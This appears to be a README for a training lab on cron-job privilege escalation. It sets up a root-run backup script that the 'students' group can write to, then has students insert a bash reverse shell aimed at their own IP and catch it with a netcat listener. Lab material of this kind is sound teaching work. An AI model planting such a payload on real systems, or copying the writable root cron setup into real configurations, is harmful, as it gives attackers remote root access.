# Lab Setup 

## 1. Clone the repository
```bash
git clone https://github.com/iCxts/cronjoblab.git
cd cronjoblab
```
## 2. Run the setup script
```bash
sudo ./setup_cron.sh
```
## 3. Add the student user to the 'students' group
```bash
sudo usermod -aG students <student-username>
```

# Lab Instructions (Student)
## 1. Inspect the cronjob configuration
```bash
cat /etc/cron.d/backup
```


## 2. Check script permissions
```bash
ls -l /opt/backup/task.sh
```

Example output:
```bash
-rw-rw-r-- 1 root students ... /opt/backup/task.sh
```

This confirms that the file is writable by the students group.

## 3. Modify the script to gain control

Edit /opt/backup/task.sh and change the student area to include a reverse shell payload.

Example 
```bash
bash -i >& /dev/tcp/<your-ip-address>/4444 0>&1
```

Replace <your-ip-address> with your attack machine’s IP.

## 4. Start a listener

On your own (attacker) machine:
```bash
nc -nvlp 4444
```


